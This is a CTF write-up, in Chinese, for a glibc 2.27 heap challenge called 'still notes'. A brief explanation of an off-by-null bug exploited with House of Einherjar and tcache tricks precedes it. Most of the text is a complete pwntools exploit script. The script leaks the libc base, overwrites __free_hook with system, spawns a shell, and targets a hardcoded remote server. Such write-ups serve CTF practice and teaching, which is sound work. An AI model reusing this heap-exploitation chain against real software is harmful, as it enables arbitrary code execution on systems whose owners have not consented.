# 你满了,那我就漫出来了! 

*still notes*

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO|Partial|
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |no    |

## 解题思路

glibc 2.27  
没有UAF，大小限制在0x120以内，只有一个off-by-null...

好不容易在网上找到了例题，show和alloc都需要打House of Einherjar，主要利用合并机制
（例题附在参考文献中）

要注意的是，对于tcache堆块，无论是否有`PREV_INUSE`标记，都不会发生合并，这也是需要绕过的点

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']

def payload(lo:int):
    global sh
    if lo:
        sh = process('./stillnotes')
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('139.196.183.57', 32026)
    libc = ELF('./libc-2.27.so')

    def addn(idx:int, size:int, content:bytes=b' ', hooked:bool=False):
        sh.sendlineafter(b'ice:', b'1')
        sh.sendlineafter(b'Index', str(idx).encode())
        sh.sendlineafter(b'Size', str(size).encode())
        if hooked:
            return
        if len(content) == size:
            sh.sendafter(b'Content', content)
        else:
            sh.sendlineafter(b'Content', content)

    def deln(idx:int):
        sh.sendlineafter(b'ice:', b'3')
        sh.sendlineafter(b'Index', str(idx).encode())

    def show(idx:int) -> bytes:
        sh.sendlineafter(b'ice:', b'2')
        sh.sendlineafter(b'Index: ', str(idx).encode())
        return sh.recvline()

    # house of einherjar
    # leak libc addr (unsorted bin)
    addn(15, 0xf8)
    addn(14, 0xf8)
    addn(13, 0xf8)
    addn(12, 0xf8)
    addn(11, 0xf8)
    addn(10, 0xf8)
    addn(9, 0xf8) # prevent chunks being merged into top chunk
    addn(0, 0xf8) # 0 1 2 chunk: key structure
    addn(1, 0x38) # size != 0x100 to speed up modification below
    addn(2, 0xf8)
    addn(8, 0x8) # prevent chunks being merged into top chunk
    deln(9)
    deln(10)
    deln(11)
    deln(12)
    deln(13)
    deln(14)
    deln(15) # fill tcache
    deln(0)
    deln(1)
    addn(1, 0x38, b'0'*0x30 + p64(0x140)) # make heap overlap (off-by-null)
    deln(2)
    addn(15, 0xf8)
    addn(14, 0xf8)
    addn(13, 0xf8)
    addn(12, 0xf8)
    addn(11, 0xf8)
    addn(10, 0xf8)
    addn(9, 0xf8) # use up tcache
    addn(0, 0xf8) # cut up merged chunk and libc writes fd on chunk 1
    ret = show(1)

    dumpArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2
    mainArena = u64(ret[:6] + b'\0\0')
    libcBase = mainArena - dumpArena - 0x60 # sub unsorted bin offset
    print(f'\x1b[33mleak libcBase: {hex(libcBase)}\x1b[0m')
    freeHook = libcBase + libc.symbols['__free_hook']
    systemAddr = libcBase + libc.symbols['system']

    # double free to alloc at freeHook
    deln(9)
    deln(10)
    deln(11)
    deln(12)
    deln(13)
    deln(14)
    deln(15) # fill tcache
    deln(0)                                 # restore merged chunk
    addn(3, 0x58)                           # raise chunk since we can't alloc a chunk larger than 0x100
    addn(0, 0xb8, b'0'*0x98 + p64(0x40))    # so we do modifications in this chunk (restore overlapped chunk size)
    deln(1)                                 # put chunk 1 in tcache             (head -> 1 -> NULL)
    deln(0)                                 # restore merged chunk (chunk 1 pre_inuse not set)
    addn(0, 0xb8, b'0'*0x98 + p64(0x40) + p64(freeHook)) # modify chunk1.key, (later it will be overridden)
    deln(1)                                              # so we can do tcache dup (head -> 1 -> 1) (tcache size is 2)
    deln(0)                                 # restore merged chunk
    addn(0, 0xb8, b'0'*0x98 + p64(0x40) + p64(freeHook)) # write freeHook on fd (head -> 1 -> freeHook)
    addn(1, 0x38)
    addn(4, 0x38, p64(systemAddr)) # write systemAddr on freeHook
    addn(5, 0x18, b'/bin/sh\0')
    deln(5)

    sh.clean()
    sh.interactive()
```

## 参考文献

1. [Off-by-One精选博客](https://song-10.gitee.io/2020/05/14/pwn-2020-05-14-Off-By-One/#Control-Instruction-Pointer)
